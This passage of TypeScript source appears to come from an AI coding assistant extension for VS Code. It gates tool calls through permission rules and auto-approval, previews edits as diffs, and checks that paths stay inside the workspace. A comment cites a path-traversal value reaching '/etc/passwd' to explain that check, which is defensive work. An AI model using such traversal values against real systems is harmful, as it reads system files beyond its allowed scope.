      const message = (err as Error).message;
      const last = this.session.entries[this.session.entries.length - 1];
      if (last?.role === "assistant" && !last.text) last.error = message;
      this.post({ type: "error", message });
      this.log.appendLine(`[turn] ${message}`);
    } finally {
      this.turn = undefined;
      this.post({ type: "turnEnd" });
      this.sendState();
    }
  }

  /**
   * Ask, unless the permission book already answered. The book is consulted BEFORE the panel is
   * disturbed, which is what makes "toujours autoriser" worth anything.
   */
  private askApproval(req: { tool: string; description: string; args: Record<string, unknown> }): Promise<boolean> {
    const decision = this.permissions.decide(req.tool, req.args);

    // A standing refusal comes first and is checked below; a standing ALLOWANCE and the scope
    // policy are equivalent in effect, so either may satisfy the request. What may never happen is
    // a scope turning a refusal into a permission, which is why this sits after `decide` rather
    // than before it.
    if (decision !== "never") {
      const settings = readSettings();
      const path = pathArgument(req.args);
      const auto = autoApprove(
        {
          scope: settings.permissions.autoApprove,
          allowedPaths: settings.permissions.allowedPaths,
          allowedCommands: settings.permissions.allowedCommands,
          deniedPaths: settings.permissions.deniedPaths,
          deniedCommands: settings.permissions.deniedCommands,
          // The privacy list is passed in rather than duplicated: one list, one place to change it.
          blockedGlobs: settings.privacy.blockedGlobs,
        },
        {
          tool: req.tool,
          ...(path ? { path, insidePath: isInsideWorkspace(path) } : {}),
          ...(req.tool === "run_command" ? { command: String(req.args["command"] ?? "") } : {}),
        },
        matchGlob,
      );
      if (auto.allow) {
        this.post({ type: "status", text: t("{0} — {1}", req.description, auto.because), tool: req.tool, ok: true });
        return Promise.resolve(true);
      }
    }

    if (decision === "always" || decision === "session") {
      this.post({ type: "status", text: t("{0} — allowed by a rule", req.description), tool: req.tool, ok: true });
      return Promise.resolve(true);
    }
    if (decision === "never") {
      this.post({ type: "status", text: t("{0} — refused by a rule", req.description), tool: req.tool, ok: false });
      return Promise.resolve(false);
    }

    const id = randomNonce();
    const command = req.tool === "run_command" ? String(req.args["command"] ?? "") : undefined;
    this.post({ type: "approval", id, tool: req.tool, description: req.description, ...(command ? { command } : {}) });
    return new Promise<boolean>((resolve) => {
      this.approvals.set(id, (answer) => {
        if (answer === "session" || answer === "always") {
          this.permissions.remember(req.tool, req.args, answer);
          this.sendState();
        }
        resolve(answer !== "no");
      });
      // A turn that is cancelled must not leave a promise hanging forever.
      this.turn?.signal.addEventListener("abort", () => {
        if (this.approvals.delete(id)) resolve(false);
      });
    });
  }

  /** Show the change as a diff before it is applied — the reviewable-edit rule. */
  private async confirmEdit(uri: vscode.Uri, next: string): Promise<boolean> {
    const original = await readOrEmpty(uri);
    const preview = uri.with({ scheme: "hivey-code-preview", query: Date.now().toString() });
    previewContents.set(preview.toString(), next);
    await vscode.commands.executeCommand(
      "vscode.diff",
      original === undefined ? vscode.Uri.parse("untitled:nouveau") : uri,
      preview,
      t("{0} — proposed by Hivey Code", relative(uri)),
      { preview: true },
    );
    const answer = await vscode.window.showInformationMessage(
      t("Apply the change to {0}?", relative(uri)),
      { modal: false },
      t("Apply"),
      t("Refuse"),
    );
    previewContents.delete(preview.toString());
    return answer === t("Apply");
  }
}

/** Backing store for the diff preview documents. */
export const previewContents = new Map<string, string>();

export class PreviewProvider implements vscode.TextDocumentContentProvider {
  provideTextDocumentContent(uri: vscode.Uri): string {
    return previewContents.get(uri.toString()) ?? "";
  }
}

function workspaceNote(): string {
  const folder = vscode.workspace.workspaceFolders?.[0];
  return folder ? `\n\nWorkspace: ${folder.name}.` : "";
}

/**
 * The rules of the dialect in the active editor, when that dialect has rules a model gets wrong.
 *
 * Only IBM i qualifies today, and it qualifies badly: a model that writes free-form RPG into a
 * fixed-format member produces something that looks right, compiles into something else, and fails
 * in a spool file. The text is appended to the SYSTEM prompt rather than to the turn, which sounds
 * like it would break the prompt cache on every file switch — it does not, because the text depends
 * on the dialect and not on the file. A conversation about RPG keeps the same prefix throughout.
 */
function dialectNote(): string {
  const doc = vscode.window.activeTextEditor?.document;
  if (!doc) return "";
  const lang = detectIbmiLanguage(doc.uri.path, doc.getText().slice(0, 20_000));
  return lang ? `\n\n${ibmiPrompt(lang)}` : "";
}

function safeUrl(s: Settings, id: Settings["chat"]["provider"]): string {
  try {
    return endpointFor(s, id);
  } catch {
    return "";
  }
}

async function readOrEmpty(uri: vscode.Uri): Promise<string | undefined> {
  try {
    return new TextDecoder().decode(await vscode.workspace.fs.readFile(uri));
  } catch {
    return undefined;
  }
}

function estimateCost(promptTokens: number, price: Price | undefined): number {
  if (!price) return 0;
  // Assume an answer about a quarter the size of the question: enough to catch a runaway prompt,
  // not so pessimistic that the cap fires on ordinary turns.
  return (promptTokens * price.in + promptTokens * 0.25 * price.out) / 1_000_000;
}

function randomNonce(): string {
  const bytes = new Uint8Array(16);
  // The webview CSP nonce and the untrusted-content fence both depend on this being unguessable.
  (globalThis.crypto ?? require("node:crypto").webcrypto).getRandomValues(bytes);
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

export { commandPrefix };

/**
 * The path a tool call is about, if it is about one.
 *
 * Tools name it differently — `path` for a file, `member` for an IBM i source member — and a policy
 * about paths that only understood one of those spellings would be a policy with a hole in it.
 */
function pathArgument(args: Record<string, unknown>): string | undefined {
  for (const key of ["path", "file", "member", "uri"]) {
    const value = args[key];
    if (typeof value === "string" && value.trim()) return value.trim();
  }
  return undefined;
}

/**
 * Whether a path resolves inside the open folder.
 *
 * Resolved against the real root rather than matched as text: `src/../../etc/passwd` is a relative
 * path that reads as being inside the workspace and is not. A textual check is exactly the check
 * this has to not be.
 */
function isInsideWorkspace(path: string): boolean {
  const folder = vscode.workspace.workspaceFolders?.[0];
  if (!folder) return false;
  const root = folder.uri.fsPath.replace(/\\/g, "/").replace(/\/+$/, "");
  const absolute = /^([a-zA-Z]:)?[/\\]/.test(path)
    ? path.replace(/\\/g, "/")
    : `${root}/${path.replace(/\\/g, "/")}`;
  const resolved = normalise(absolute);
  return resolved === root || resolved.startsWith(`${root}/`);
}

/** Collapse `.` and `..` without touching the filesystem — the path may not exist yet. */
function normalise(path: string): string {
  const out: string[] = [];
  for (const part of path.split("/")) {
    if (!part || part === ".") continue;
    if (part === "..") out.pop();
    else out.push(part);
  }
  return (path.startsWith("/") ? "/" : "") + out.join("/");
}
